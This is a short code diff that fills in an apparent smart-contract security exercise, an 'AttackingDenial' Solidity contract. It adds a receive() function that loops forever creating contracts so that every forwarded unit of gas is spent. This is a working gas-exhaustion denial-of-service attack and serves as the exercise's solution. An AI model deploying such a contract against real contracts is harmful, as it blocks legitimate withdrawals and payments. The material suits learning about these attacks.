@@ -9,5 +9,13 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() payable external {
+        while(true) {
+            // gas intensive just to reduce test time (:
+            // create -> 
+            assembly {
+                pop(create(0,0,0))
+            }
+        }
+    }
 }
